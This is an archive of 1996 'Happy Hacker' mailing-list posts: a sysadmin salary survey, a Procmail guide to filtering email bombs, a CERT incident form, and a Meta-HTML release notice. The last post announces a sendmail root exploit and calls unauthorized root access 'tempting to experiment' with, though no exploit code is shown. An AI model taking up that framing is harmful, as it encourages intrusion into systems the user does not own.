Happy Hacker posts: Sept. 1996

Thu Sep 05 20:28:43 1996 
From: "Carolyn P. Meinel" <cmeinel@techbroker.com> 
Subject: Happy Hacker: Sysadmin salaries 
 

How's this for another reason to install Linux on your home computer and use it to become a Unix wizard? This comes from the tin version of the news group news.sysadmin:

Mon, 02 Sep 1996 17:49:13        news.sysadmin              Thread    1 of    1 
Lines 76                   Salary Survey Results            1 Response 
sans@clark.net  SANS'96 Conference Office at Clark Internet Services, Inc., Ell 
  
Sysadmin and Security Salary Survey Results 
  
The three tables below are extracted from the final report on the 1995 
SANS Salary Survey, conducted last September.  The report included a total 
of 10 tables including summaries of salary by size of employer, by type of 
employer, by number of people managed, and also included a table of 
reasons for larger than average raises. 
  
To receive survey results for this year (1996), either complete the 1996 
survey form or attend Network Security 96 in Washington DC in November. 
For a copy of the survey form, email sans@clark.net with the words salary 
survey in the subject line or in the body of your email. For a copy of the 
program and registration package for Network Security 96, email 
sans@clark.net with the word package in the subject or body.

Table 1: 1995 Salary Distributions 
  
Salary                  Percentage 
Under $20,000             0.5% 
$20,000 - $29,999         5.8% 
$30,000 -$ 39,999        18.6% 
$40,000 - $49,999        29.2% 
$50,000 -$ 59,999        21.7% 
$60,000 - $69,999        13.8% 
$70,000 - $79,999         5.4% 
$80,000 - $89,999         2.9% 
$90,000 - $99,999         0.5% 
$100,000 and over         1.5% 
Total                   100.0% 
  
Table 2: 
How Rapidly Did Salaries Increase From 1994 to 1995? 
  
  Current Salary        Increase From Prior Year 
 Under $20,000           2.7% 
 $20,000 - $29,999       7.3% 
 $30,000 - $39,999       9.0% 
 $40,000 - $49,999       8.7% 
 $50,000 - $59,999       9.9% 
 $60,000 - $69,999      14.5% 
 $70,000 - $79,999       8.0% 
 $80,000 - $89,999      11.2% 
 $90,000 - $99,999       6.5% 
 $100,000 and over      18.1% 
 Overall Average         9.8%

Table 3 
Does Geographic Region Affect Salaries? 
  
Region          Average 
California      $57,061 
Northeast       $56,400 
Southwest       $53,217 
Overall Average $50,127 
Mountain        $49,608 
Mid-Atlantic    $49,198 
West (excl. CA) $48,412 
Southeast       $47,677 
Midwest         $47,159 
Europe          $43,146 
Canada          $40,094 
Australia       $32,875 
Middle East     $31,900 
  
-- 
Alan Paller 
Next Conference: Second Annual Network Security Conference 
Washington DC Convention Center, November 4-8, 1996 
  
Next SANS Conference: April 19-25, 1997 at Baltimore Inner Harbor

Thu Sep 12 12:26:02 1996 
From: "Z.B." <zachb@netcom.com> (by way of "Carolyn P. Meinel" <cmeinel@techbroker.com>) 
Subject: Anti-Ebomb Document for Happy Hacker

Whew.  I spent a lot more time on this file than i thought I would.  I 
tried to keep it short, so a few places may be lacking in the way of 
explanations, so let me know if you see anything that needs to be 
explained more/better. 
 

Zach Babayco

zachb@netcom.com  <----- finger for PGP public key 
http://www.geocities.com/SiliconValley/Park/4127

---

Defending Against Email-Bombing and Unwanted Mail

Copyright (C) Zach Babayco, 1996

[Before I start this article, I would like to thank Nancy McGough for letting 
me quote liberally from her Filtering Mail FAQ, available at http://www.cis. 
ohio-state.edu/hypertext/faq/usenet/mail/filtering-faq/faq.html.  This is 
one of the best filtering-mail FAQs out there, and if you have any 
problems with my directions or want to learn more about filtering mail, 
this is where you should look.]

Lately, there are more and more people out there sending you email that 
you just don't want, like "Make Money Fast!" garbage or lame ezines that 
you never requested or wanted in the first place.  Worse, there is the 
emailbomb.

There are two types of emailbombs, the Massmail and the Mailing List bomb:

1) Massmail-bombing.  This is when an attacker sends you hundreds, or 
perhaps even thousands of pieces of email, usually by means of a script 
and fakemail.  Of the two types, this is the easier to defend against, 
since the messages will be coming from just a few addresses at the most.

2) Mailing List bombs.  In this case, the attacker will subscribe you to 
as many mailing lists as he or she can.  This is much worse than a massmail 
because you will be getting email from many different mailing lists, and 
will have to save some of it so that you can figure out how to unsubscribe 
from each list.

This is where Procmail comes in.  Procmail (pronounced prok-mail) is a 
email filtering program that can do some very neat things with your mail, 
like for example, if you subscribe to several high-volume mailing lists, 
it can be set up to sort the mail into different folders so that all the 
messages aren't all mixed up in your Inbox.  Procmail can also be 
configured to delete email from certain people and addresses. 
 

Setting up Procmail 
-------------------

First, you need to see if your system has Procmail installed.  From the 
prompt, type:

> which procmail

If your system has Procmail installed, this command will tell you where 
Procmail is located.  Write this down - you will need it later.

*NOTE* If your system gives you a response like "Unknown command: which" 
then try substituting 'which' with 'type', 'where', or 'whereis'.

If you still cannot find Procmail, then it is probably a good bet that 
your system does not have it installed.  However, you're not completely 
out of luck - look at the FAQ i mentioned at the beginning of this file 
and see if your system has any of the programs that it talks about.

Next, you have to set up a resource file for Procmail.  For the rest of this 
document, I will use the editor Pico.  You may use whichever editor you feel 
comfortable with.

Make sure that you are in your home directory, and then start up your editor.

> cd 
> pico .procmailrc

Enter the following in the .procmailrc file:

# This line tells Procmail what to put in its log file.  Set it to on when 
# you are debugging. 
VERBOSE=off

# Replace 'mail' with your mail directory. 
MAILDIR=$HOME/mail

# This is where the logfile and rc files will be kept 
PMDIR=$HOME/.procmail

LOGFILE=$PMDIR/log 
# INCLUDERC=$PMDIR/rc.ebomb 
(yes, type the INCLUDERC line WITH the #)

Now that you've typed this in, save it and go back up to your home directory.

> cd 
> mkdir .procmail

Now go into the directory that you just made, and start your editor up with 
a new file: rc.ebomb:

IMPORTANT:  Be sure that you turn off your editor's word wrapping during 
this part.  You will need to have the second, third, and fourth lines of 
this next example all on one line.  With Pico, use the -w flag.  Consult 
your editor's manual page for instructions on turning off its word wrapping. 
Make sure that when you edit it, you leave NO SPACES in that line.

> cd .procmail 
> pico -w rc.noebomb

# noebomb - email bomb blocker

:0 
* ! (^(((Resent-)?(From|Sender)|X-Envelope-From):|From )(.*[^.%@a-z0-9])? 
(Post(ma?(st(e?r)?|n)|office)|Mail(er)?|daemon|mmdf|root|uucp|LISTSERV|owner 
|request|bounce|serv(ices?|er))([^.!:a-z0-9]|$))) 
* ! ^From:.*(postmaster|Mailer|listproc|majordomo|listserv|cmeinel|johnb) 
* ! ^TO(netstuff|computing|pcgames) 
/dev/null

Lets see what these do.  The first line tells Procmail that this is the 
beginning of a "recipe" file.  A recipe it basically what it sounds like 
- it tells the program what it should look for in each email message, and 
if it finds what it is looking for, it performs an action on the message 
- forwarding it to someone; putting it in a certain folder; or in this 
case, deleting it.

The second, third, and fourth lines (the ones beginning with a *)are called 
CONDITIONS.  The asterisk (*) tells Procmail that this is the beginning of a 
condition.  The ! tells it to do the OPPOSITE of what it would normally do.

Condition 1:

* ! (^(((Resent-)?(From|Sender)|X-Envelope-From):|From )(.*[^.%@a-z0-9])? 
(Post(ma?(st(e?r)?|n)|office)|Mail(er)?|daemon|mmdf|root|uucp|LISTSERV|owner 
|request|bounce|serv(ices?|er))([^.!:a-z0-9]|$)))

Don't freak out over this, it is simpler than it seems at first glance. 
This condition tells Procmail to look at the header of a message, and see 
if it is from one of the administrative addresses like root or 
postmaster, and also check to see if it is from a mailer-daemon (the 
thing that sends you mail when you bounce a message).  If a message IS 
from one of those addresses, the recipe will put the message into your 
inbox and not delete it.

Advanced User Note:  Those of you who are familiar with Procmail are 
probably wondering why I require the user to type in that whole long line 
of commands, instead of using the FROM_MAILER command.  Well, it looked 
like a good idea at first, but I just found out a few days ago that 
FROM_MAILER also checks the Precedence: header for the words junk, bulk, 
and list.  Many (if not all) mailing-list servers have either Precedence: 
bulk or Precedence: list, so if someone subscribes you to several hundred 
lists, FROM_MAILER would let most of the messages through, which is NOT 
what we want.

Condition 2:

* ! ^From:.*(listproc|majordomo|cmeinel|johnb)

This condition does some more checking of the From: line in the header. 
In this example, it checks for the words listproc, majordomo, cmeinel, 
and johnb.  If it is from any of those people, it gets passed on to your 
Inbox.  If not, it's a goner.  This is where you would put the usernames 
of people who normally email you, and also the usernames of mailing-list 
servers, such as listproc and majordomo.  When editing this line, 
remember to: only put the username in the condition, not a persons full 
email address, and remember to put a | between each name.

Condition 3:

* ! ^TO(netnews|crypto-stuff|pcgames)

This final condition is where you would put the usernames of the mailing 
lists that you are subscribed to (if any).  For example, I am subscribed 
to the netnews, crypto-stuff, and pcgames lists.  When you get a message 
from most mailing lists, most of the time the list address will be in the 
To: or Cc: part of the header, rather than the From: part.  This line 
will check for those usernames and pass them through to your Inbox if 
they match.  Editing instructions are the same as the ones for Condition 2.

The final line, /dev/null, is essentially the trash can of your system. 
If a piece of email does not match any of the conditions, (i.e. it isn't 
from a mail administrator, it isn't from a listserver or someone you 
write to, and it's not a message from one of your usual mailing lists) 
Procmail dumps the message into /dev/null, never to be seen again.

Ok.  Now you should have created two files:  .procmailrc and rc.noebomb. 
We need one more before everything will work properly.  Save rc.noebomb 
and exit your editor, and go to your home directory.  Once there, start 
your editor up with the no word wrapping command.

> cd 
> pico -w .forward

We now go to an excerpt from Nancy M.'s Mail Filtering FAQ:

    Enter a modified version of the following in your ~/.forward:

     "|IFS=' ' && exec /usr/local/bin/procmail -f- || exit 75 #nancym"

    == IMPORTANT NOTES == 
    * Make sure you include all the quotes, both double (") and single ('). 
    * The vertical bar (|) is a pipe. 
    * Replace /usr/local/bin with the correct path for procmail (see step 1). 
    * Replace `nancym' with your userid.  You need to put your userid in 
      your .forward so that it will be different than any other .forward 
      file on your system.

    * Do NOT use ~ or environment variables, like $HOME, in your .forward 
      file.  If procmail resides below your home directory write out the 
      *full* path.

    On many systems you need to make your .forward world 
    readable and your home directory world searchable in order for the 
    mail transport agent to "see" it.  To do this type:

      cd 
      chmod 644 .forward 
      chmod a+x .

If the .forward template above doesn't work the following alternatives 
might be helpful:

In a perfect world: 
        "|exec /usr/local/bin/procmail #nancym" 
In an almost perfect world: 
        "|exec /usr/local/bin/procmail USER=nancym" 
In another world: 
        "|IFS=' ';exec /usr/local/bin/procmail #nancym" 
In a different world: 
        "|IFS=' ';exec /usr/local/bin/procmail USER=nancym" 
In a smrsh world: 
        "|/usr/local/bin/procmail #nancym" 
 

Now that you have all the necessary files made, it's time to test this 
filter.  Go into your mailreader and create a new folder called 
Ebombtest.  This procedure differs from program to program, so you may 
have to experiment a little.  Then open up the rc.noebomb file and change 
/dev/null to Ebombtest.  (You should have already changed Conditions 2 
and 3 to what you want; if not, go do it now!)  Finally, open up 
.procmailrc and remove the # from the last line.

You will need to leave this on for a bit to test it.  Ask some of the 
people in Condition 2 to send you some test messages.  If the messages 
make it through to your Inbox, then that condition is working fine.  Send 
yourself some fake email under a different name and check to see if it 
ends up in the Ebombtest folder.  Also, send yourself some fakemail from 
root@wherever.com to make sure that Condition 1 works.  If you're on any 
mailing lists, those messages should be ending up in your Inbox as well.

If all of these test out fine, then congratulations!  You now have a 
working defense against email bombs.  For the moment, change the 
Ebombtest line in the rc.noebomb file back to /dev/null, and put the # 
in front of the INCLUDERC line in the .procmailrc file.  If someone ever 
decides to emailbomb you, you only need to remove the #, and you will 
have greatly cut down on the amount of messages coming into your Inbox, 
giving you a little bit of breathing room to start unsubscribing to all 
those lists, or start tracking down those idiots who did it and get their 
asses kicked off their ISP's.

If you have any comments or questions about this, email me at 
zachb@netcom.com.  Emailbombs WILL go to /dev/null, so don't bother!

Disclaimer:  When you activate this program, it is inevitable that a 
small amount of wanted mail MAY get put into /dev/null, due to the fact 
that it is nearly impossible to know the names of all the people that may 
write to you.  Therefore, I assume no responsibility for any email which 
may get lost, and any damages which may come from those lost messages. 
 

Thu Sep 12 14:32:49 1996 
From: "Carolyn P. Meinel" <cmeinel@techbroker.com> 
Subject: Happy Hacker: Information on CERT 
>From: CERT Coordination Center <cert@cert.org> 
>Subject: Automatic E-mail Response. 
>To: cmeinel@techbroker.com 
>Date: Thu, 12 Sep 96 17:52:14 EDT 
>Reply-To: CERT Coordination Center <cert@cert.org> 
> 
> 
>[NOTE -- THIS IS AN AUTOMATED RESPONSE] 
> 
>The CERT(sm) Coordination Center is presently handling a heavy incident 
>workload.  Your e-mail is very important to us, and we will respond to it 
>as soon as possible. 
> 
>All e-mail to cert@cert.org is prioritized.  The following Incident 
>reports receive the highest priority and are considered emergencies: 
> 
> - possible life-threatening activity 
>        - attacks on the Internet infrastructure (such as root name 
>   servers, domain name servers, major archive sites, and 
>   network access points--NAPs, or widespread automated 
>   attacks against Internet sites) 
>        - network sniffers 
>        - router attacks 
>        - root compromises 
> 
>If you are reporting such an emergency outside our operational hours - 
>business days between 08:30-17:00 EST/EDT (GMT-5)/(GMT-4) and require 
>immediate assistance, then, please call the CERT hotline: 
> 
>        +1 412 268 7090 
> 
>The following information can help you to address needs for other 
>incident types and information sources 
> 
>  Intruder Detection Checklist 
>    ftp://info.cert.org/pub/tech_tips/intruder_detection_checklist 
> 
>  Steps for Recovering from a UNIX Root Compromise 
>    ftp://info.cert.org/pub/tech_tips/root_compromise 
> 
>  UNIX Configuration Guidelines 
>    ftp://info.cert.org/pub/tech_tips/UNIX_configuration_guidelines 
> 
>  List of Security Tools 
>    ftp://info.cert.org/pub/tech_tips/security_tools 
> 
>  Overview of CERT advisories 
>    ftp://info.cert.org/pub/cert_advisories/01-README 
> 
>  Overview of CERT vendor initiated bulletins (VIB's) 
>    ftp://info.cert.org/pub/cert_bulletins/01-README 
> 
>  Overview of CERT summaries 
>    ftp://info.cert.org/pub/cert_summaries/01-README 
> 
>  FIRST contact information 
>    ftp://info.cert.org/pub/FIRST/first-contacts 
> 
>  CERT Coordination Center FAQ 
>    ftp://info.cert.org/pub/cert_faq 
> 
> 
>Keep us informed about your incident - let us know of any actions you 
>take, intruder tools you discover, and what other sites may be 
>affected. If you have not already done so, please complete an incident 
>reporting form, which you can get from 
> 
>          ftp://info.cert.org/pub/incident_report_form 
> 
>If you believe the intruder activity is a threat to people's lives or to 
>the Internet infrastructure, please contact us immediately. 
> 
>We appreciate your understanding and cooperation. 
> 
>CERT Coordination Center 
>Software Engineering Institute 
>Carnegie Mellon University 
>Pittsburgh, PA  USA  15213-3890 
> 
>Internet e-mail:  cert@cert.org (monitored during business hours) 
> 
>Telephone: +1-412-268-7090 24-hour hotline 
>CERT Coordination Center personnel answer business days 08:30-17:00 
>EST/EDT (GMT-5)/(GMT-4), on call for emergencies during other hours. 
>Fax: +1-412-268-6989 
> 
> 
>**************************** cut here **************************** 
>version 3.0 
>February 28, 1996 
> 
> 
>                       CERT(sm) Coordination Center 
>                       Incident Reporting Form 
> 
>The CERT Coordination Center (CERT/CC) has developed the following form in 
>an effort to gather incident information.  We would appreciate your 
>completing the form below in as much detail as possible.  The information 
>is optional, but from our experience we have found that having the answers 
>to all the questions enables us to provide the best assistance.  Completing 
>the form also helps avoid delays while we get back to you requesting the 
>information we need in order to help you.  Sites have told us, as well, 
>that filling out the form has helped them work through the incident. 
> 
>Note that our policy is to keep any information specific to your site 
>confidential unless we receive your permission to release that information. 
> 
>Please feel free to duplicate any section as required.  Please return this 
>form to cert@cert.org.  If you are unable to email this form, please send 
>it by FAX.  The CERT/CC FAX number is 
> 
>  +1 412 268 6989 
> 
>Thank you for your cooperation and help. 
>............................................................................ 
> 
> 
>1.0. General Information 
> 
>     1.1. Incident number (to be assigned by the CERT/CC):  CERT# 
> 
>     1.2. Reporting site information 
> 
>          1.2.1.  Name (e.g., CERT Coordination Center): 
>          1.2.2.  Domain Name (e.g., cert.org): 
>          1.2.3.  Brief description of the organization: 
>          1.2.4.  Is your site an Internet Service Provider (Yes/No): 
> 
> 
>2.0. Contact Information 
> 
>     2.1. Your contact information 
> 
>           2.1.1.  Name: 
>           2.1.2.  Email address: 
>           2.1.3.  Telephone number: 
>           2.1.4.  FAX number: 
>           2.1.5.  Pager number: 
>           2.1.6.  Home telephone number (for CERT/CC internal use only): 
>           2.1.7.  Secure communication channel (e.g., PGP, PEM, DES, secure 
>                    telephone/FAX) [NOTE -- we will call to obtain the secure 
>                    communication channel information] (Yes/No): 
> 
>     2.2. Additional contact information (if available) 
> 
>           2.2.1.  Name: 
>           2.2.2.  Email address: 
>           2.2.3.  Telephone number: 
>           2.2.4.  FAX number: 
>           2.2.5.  Pager number: 
>           2.2.6.  Home telephone number (for CERT/CC internal use only): 
>           2.2.7.  Secure communication channel (Yes/No): 
> 
>     2.3. Site security contact information (if applicable) 
> 
>           2.3.1.  Name: 
>           2.3.2.  Email address: 
>           2.3.3.  Telephone number: 
>           2.3.4.  FAX number: 
>           2.3.5.  Pager number: 
>           2.3.6.  Home telephone number (for our internal use only): 
>           2.3.7.  Secure communication channel (Yes/No): 
> 
>     2.4. Contact information for other site(s) involved in this incident (if 
>           available) 
> 
>           2.4.1.  Site name: 
>           2.4.2.  Contact person name: 
>           2.4.3.  Email address: 
>           2.4.4.  Telephone number: 
>           2.4.5.  FAX number: 
>           2.4.6.  Pager number: 
>           2.4.7.  Home telephone number (for CERT/CC internal use only): 
>           2.4.8.  Secure communication channel (Yes/No): 
> 
>     2.5. Contact information for any other incident response team(s) (IRTs) 
>           that has/have been notified (if available) 
> 
>           2.5.1.  IRT name: 
>           2.5.2.  Constituency domain: 
>           2.5.3.  Contact person name: 
>           2.5.4.  Email address: 
>           2.5.5.  Telephone number: 
>           2.5.6.  FAX number: 
>           2.5.7.  Pager number: 
>           2.5.8.  Home telephone number (for CERT/CC internal use only): 
>           2.5.9.  Secure communication channel (Yes/No): 
>           2.5.10. IRT reference number: 
> 
>     2.6. Contact information for any law enforcement agency(ies) that 
>   has/have been notified (if available) 
> 
>          2.6.1.  Law enforcement agency name: 
>          2.6.2.  Contact person name: 
>          2.6.3.  Email address: 
>          2.6.4.  Telephone number: 
>          2.6.5.  FAX number: 
>          2.6.6.  Pager number: 
>          2.6.7.  Home telephone number (for CERT/CC internal use only): 
>          2.6.8.  Secure communication channel (Yes/No): 
>          2.6.9.  Law enforcement agency reference number: 
> 
> 
>3.0. Contacting Sites Involved 
> 
>     3.1. We ask that reporting sites contact other sites involved in 
>   incident activity.  Please let us know if you need assistance 
>   in obtaining contact information for the site(s) involved. 
> 
>          When contacting the other sites, we would very much 
>   appreciate a cc to the "cert@cert.org" alias.  This helps 
>   us identify connections between incidents and understand 
>   the scope of intruder activity.  We would also appreciate 
>   your including our incident number in the subject line of 
>   any correspondence relating to this incident if one 
>   has been assigned (see item 1.1.). 
> 
>          If you are unable to contact the involved sites, please get in 
>   touch with us to discuss how we can assist you. 
> 
>     3.2. Disclosure information -- may we give the following types of 
>          information to 
> 
>          3.2.1. the sites involved in this incident 
> 
>   3.2.1.1. your domain (Yes/No): 
>     3.2.1.2. your host(s) involved (Yes/No): 
>      3.2.1.3. your contact information (Yes/No): 
> 
>          3.2.2. incident response teams, for sites from their 
>                 constituencies involved in this incident 
> 
>   3.2.2.1. your domain (Yes/No): 
>   3.2.2.2. your host(s) involved (Yes/No): 
>   3.2.2.3. your contact information (Yes/No): 
> 
>          3.2.3. law enforcement agency(ies) if there is a legal 
>                 investigation 
> 
>   3.2.3.1. your domain (Yes/No): 
>   3.2.3.2. your host(s) involved (Yes/No): 
>   3.2.3.3. your contact information (Yes/No): 
> 
> 
>4.0. Host Information 
> 
>     4.1. Host(s) involved at your site.  Please provide information on all 
>          host(s) involved in this incident at the time of the incident (one 
>          entry per host please) 
> 
>          4.1.1.  Hostname: 
>          4.1.2.  IP address(es): 
>          4.1.3.  Vendor hardware, OS, and version: 
>          4.1.4.  Security patches applied/installed as currently 
>                  recommended by the vendor and the CERT/CC 
>                  (Yes/No/Unknown): 
>          4.1.5.  Function(s) of the involved host 
> 
>                  4.1.5.1. Router (Yes/No): 
>                  4.1.5.2. Terminal server (Yes/No): 
>                  4.1.5.3. Other (e.g. mail hub, information server, DNS 
>                           [external or internal], etc.): 
> 
>          4.1.6.  Where on the network is the involved host (e.g. 
>        backbone, subnet): 
>          4.1.7.  Nature of the information at risk on the involved host 
>                  (e.g., router configuration, proprietary, personnel, 
>                  financial, etc.): 
>          4.1.8.  Timezone of the involved host (relative to GMT): 
>          4.1.9.  In the attack, was the host the source, the victim, or 
>           both: 
>          4.1.10. Was this host compromised as a result of this attack 
>                  (Yes/No): 
> 
>     4.2. Host(s) involved at other other sites (one entry per host 
>          please) 
> 
>          4.2.1. Hostname: 
>          4.2.2. IP address(es): 
>          4.2.3. Vendor hardware, OS, and version: 
>          4.2.4. Has the site been notified (Yes/No): 
>          4.2.5. In the attack, was the host the source, the victim, or 
>     both: 
>          4.2.6. Was this host compromised as a result of this attack 
>                 (Yes/No): 
> 
> 
>5.0. Incident Categories 
> 
>     5.1. Please mark as many categories as are appropriate to 
>          this incident 
> 
>          5.1.1.  Probe(s): 
>          5.1.2.  Scan(s): 
>          5.1.3.  Prank: 
>          5.1.4.  Scam: 
>          5.1.5.  Email Spoofing: 
>          5.1.6.  Email bombardment: 
> 
>        5.1.6.1. was this denial-of-service attack successful 
>              (Yes/No): 
> 
>          5.1.7.  Sendmail attack: 
> 
>       5.1.7.1. did this attack result in a compromise (Yes/No): 
> 
>          5.1.8.  Break-in 
> 
>                  5.1.8.1. Intruder gained root access (Yes/No): 
>                  5.1.8.2. Intruder installed Trojan horse program(s) 
>                (Yes/No): 
>                  5.1.8.3. Intruder installed packet sniffer (Yes/No): 
> 
>                           5.1.8.3.1. What was the full pathname(s) of the 
>                 sniffer output file(s): 
>                           5.1.8.3.2. How many sessions did the sniffer log? 
>                                      (use "grep -c 'DATA' <filename>" to 
>                                      obtain this information): 
> 
>                  5.1.8.4.  NIS (yellow pages) attack (Yes/No): 
>                  5.1.8.5.  NFS attack (Yes/No): 
>                  5.1.8.6.  TFTP attack (Yes/No): 
>                  5.1.8.7.  FTP attack (Yes/No): 
>                  5.1.8.8.  Telnet attack (Yes/No): 
>                  5.1.8.9.  Rlogin or rsh attack (Yes/No): 
>                  5.1.8.10. Cracked password (Yes/No): 
>                  5.1.8.11. Easily-guessable password (Yes/No): 
> 
>          5.1.9.  Anonymous FTP abuse (Yes/No): 
>          5.1.10. IP spoofing (Yes/No): 
>          5.1.11. Product vulnerability (Yes/No): 
> 
>                  5.1.11.1. Vulnerability exploited: 
> 
>          5.1.12. Configuration error (Yes/No): 
> 
>                  5.1.12.1. Type of configuration error: 
> 
>          5.1.13. Misuse of host(s) resources (Yes/No): 
>          5.1.14. Worm (Yes/No): 
>          5.1.15. Virus (Yes/No): 
>          5.1.16. Other (please specify): 
> 
> 
>6.0. Security Tools 
> 
>     6.1. At the time of the incident, were you any using the following 
>          security tools (Yes/No; How often) 
> 
>          Network Monitoring tools 
>             6.1.1.  Argus: 
>             6.1.2.  netlog (part of the TAMU Security Package): 
> 
>          Authentication/Password tools 
>             6.1.3.  Crack: 
>             6.1.4.  One-time passwords: 
>             6.1.5.  Proactive password checkers: 
>             6.1.6.  Shadow passwords: 
>             6.1.7.  Kerberos: 
> 
>          Service filtering tools 
>             6.1.8.  Host access control via modified daemons or wrappers: 
>             6.1.9.  Drawbridge (part of the TAMU Security Package): 
>             6.1.10. Firewall (what product): 
>             6.1.11. TCP access control using packet filtering: 
> 
>          Tools to scan hosts for known vulnerabilities 
>             6.1.12. ISS: 
>             6.1.13. SATAN: 
> 
>          Multi-purpose tools 
>             6.1.14. C2 security: 
>             6.1.15. COPS: 
>             6.1.16. Tiger (part of the TAMU Security Package): 
> 
>          File Integrity Checking tools 
>             6.1.17. MD5: 
>             6.1.18. Tripwire: 
> 
>          Other tools 
>             6.1.19. lsof: 
>             6.1.20. cpm: 
>             6.1.21. smrsh: 
>             6.1.22. append-only file systems: 
> 
>          Additional tools (please specify): 
> 
>     6.2. At the time of the incident, which of the following logs were you 
>          using, if any (Yes/No) 
> 
>          6.2.1. syslog: 
>          6.2.2. utmp: 
>          6.2.3. wtmp: 
>          6.2.4. TCP wrapper: 
>          6.2.5. process accounting: 
> 
>     6.3. What do you believe to be the reliability and integrity of 
>          these logs (e.g., are the logs stored offline or on a 
>          different host): 
> 
> 
>7.0. Detailed description of the incident 
> 
>     7.1. Please complete in as much detail as possible 
> 
>          7.1.1.  Date and duration of incident: 
>          7.1.2.  How you discovered the incident: 
>          7.1.3.  Method used to gain access to the affected host(s): 
>          7.1.4.  Details of vulnerabilities exploited that are 
>    not addressed in previous sections: 
>          7.1.5.  Other aspects of the "attack": 
>          7.1.6.  Hidden files/directories: 
>          7.1.7.  The source of the attack (if known): 
>          7.1.8.  Steps taken to address the incident (e.g., binaries 
>                  reinstalled, patches applied): 
>          7.1.9.  Planned steps to address the incident (if any): 
>          7.1.10. Do you plan to start using any of the tools listed 
>           above in question 6.0 (please list tools expected 
>    to use): 
>          7.1.11. Other: 
> 
>     7.2. Please append any log information or directory listings and 
>          timezone information (relative to GMT). 
> 
>     7.3. Please indicate if any of the following were left on your 
>   system by the intruder (Yes/No): 
> 
>          7.3.1. intruder tool output (such as packet sniffer output 
>   logs): 
>          7.3.2. tools/scripts to exploit vulnerabilities: 
>          7.3.3. source code programs (such as Trojan horse programs, 
>          sniffer programs): 
>          7.3.4. binary code programs (such as Trojan horse programs, 
>                 sniffer programs): 
>          7.3.5. other files: 
> 
>          If you answered yes to any of the last 5 questions, please call 
>   the CERT/CC hotline (+1 412 268 7090) for instructions on 
>   uploading files to us by FTP.  Thanks. 
> 
>     7.4. What assistance would you like from the CERT/CC? 
> 
> 
> 
>Copyright 1996 Carnegie Mellon University 
>This form may be reproduced and distributed without permission provided it 
>is used for noncommercial purposes and the CERT Coordination Center is 
>acknowledged. 
> 
>CERT is a service mark of Carnegie Mellon University.

Tue Sep 17 21:13:33 1996 
From: Henry Minsky <hqm@ua.com> 
Subject: Meta-HTML released under GPL free source license 
 

Hi Folks,

We have just released Meta-HTML 5.0, the worlds most powerful HTML 
scripting and application development tool, as free software, in the 
true (GNU) sense of the term.

There is a source code distribution available at WWW.METAHTML.COM.

And we implemented the Zippy The Pinhead proxy filter completely in 
Meta-HTML (try that with another HTML scripting language!).

Please download the source, compile it, and tell us what you think! 
 

The announcement is below:

    Date: Tue, 30 Jul 1996 16:34:14 -0700 (PDT) 
    From: Yobie Benjamin <yobie@best.com> 
    To: "Carolyn P. Meinel" <cmeinel@techbroker.com> 
    cc: 
    Subject: Re: Meta-HTML 
    In-Reply-To: <Pine.LNX.3.91.960730165153.2452E-100000@plato.nmia.com> 
    MIME-Version: 1.0 
    Content-Type: TEXT/PLAIN; charset=US-ASCII

    Sometimes one encounters a lynx error so one can assume the lynx error 
    encountered was server-side. That cgi probably fires up a lynx session to 
    grab the contacts of the real URL and then tweaks with them and pours them 
    through stdout.

    On Tue, 30 Jul 1996, Carolyn P. Meinel wrote:

    > Wonder how that concatenated HTML stuff works? 
    > 
    > ---------- Forwarded message ---------- 
    > Date: Tue, 30 Jul 1996 09:11:31 -0700 
    > From: Henry Minsky <hqm@ua.com> 
    > Subject: Re: Universal Access Inc. 
    > 
    > Well, our server takes an HTTP request, fetches the page, edits it, 
    > and then returns it to your browser. It rewrites all the links 
    > in the page to point back through our server... 
    > 
    > 
 

           META-HTML SOURCE RELEASE

Version 5.0 of Universal Access Inc.'s <Meta-HTML> distribution is 
now available via anonymous FTP from ftp.metahtml.com as the file 
/pub/source/metahtml-5.0.tar.gz. This release is the first publicly 
available release of the <Meta-HTML> source code.

The following phrase has been used to describe <Meta-HTML> -- 
"Server side includes on steroids." 
  
 

                    WHAT IS IT?

<Meta-HTML> is a programming language specifically designed for 
working within the World Wide Web environment. Although it is a 
genuine programming language, suitable for large-scale symbolic 
manipulation, it provides the most commonly wanted Web functionality 
as built-in primitives, so you don't have to write them. You can find 
out more about the theory of implementation in this white paper.

Web pages are authored using HTML and <Meta-HTML> 
statements freely intermixed. When a page is requested by a browser, 
the page is passed through the <Meta-HTML> engine, which 
dynamically processes any <Meta-HTML> statements to produce a 
final HTML page which is delivered to the browser.

The source distribution provides several different interpreter options:

      A CGI engine which can be run by any Unix Web server, 
      A full-featured Web server (mhttpd) with the interpreter built 
      in, 
      A standalone processor, much like Perl or Tcl, and 
      An interactive debugger, with a feel similar to GDB (mdb)

The server and engine have been designed such that it is transparent 
to <Meta-HTML> which one is in use. URLs do not need to contain 
"/cgi-bin/" in them; they simply look like standard document 
references.

In addition to flow-control, arithmetic operators, and relational 
operators, <Meta-HTML> provides the following Web application 
features:

      Stateful sessions, with or without browser cookie support, 
      GDBM database storage, retrieval and searching, 
      Network and file system streams, 
      Macros and functions, so that you can write new tags, 
      Interface to the MSQL database system, 
      File upload and download over HTTP/1.0 connections, and 
      Extended regular expression syntax in string operations

Why two database interfaces? The GDBM database interface allows 
unlimited variable length free-format records, compiles on virtually 
every platform, is completely free, and is simple and lightweight. The 
MSQL database interface allows SQL queries, fast searches over 
large amounts of data, and is in wide use today. It just seemed natural 
to support both. 
  
 

           E-MAIL ADDRESSES AND URLS

Bug reports for <Meta-HTML> should be sent to 
bug-metahtml@metahtml.com. 
Bug reports for the documentation should be sent to 
bug-manual@metahtml.com.

There is a user mailing list: metahtml-users@metahtml.com. You can 
subscribe on the Web, or by sending mail to 
metahtml-users-request@metahtml.com.

Pre-compiled distribution sets are available via the <Meta-HTML> 
Web site.

We currently have versions for:

        bsdi-2.0-i386, hpux-10.10-hppa, irix-5.3-mips, linux-i386, 
        osf-3.0-alpha, solaris-2.5-i386, solaris-2.5-sun4m, and 
        sunos-4.1.4-sun4m 
  
  
 

            AUTHORS AND MAINTENANCE

<Meta-HTML> was designed and implemented by Brian J. Fox 
(bfox@ai.mit.edu). 
It is owned by Universal Access Inc., and is released under terms 
identical to the GPL. The programs are maintained by Brian J. Fox, 
Henry Minsky, and Jarlath O' Carroll at Universal Access Inc. 
  
 

Wed Sep 25 10:52:45 1996 
From: Carolyn Meinel <cmeinel@techbroker.com> 
Subject: HH: Happy Hacker: Exploit for sendmail security hole (version 8.6.12 for FreeBSD 2.1.0) (fwd) 
 

Now that we know that *all* versions of sendmail can be used to gain 
unauthorized access to the root account, it sure is tempting to experiment.

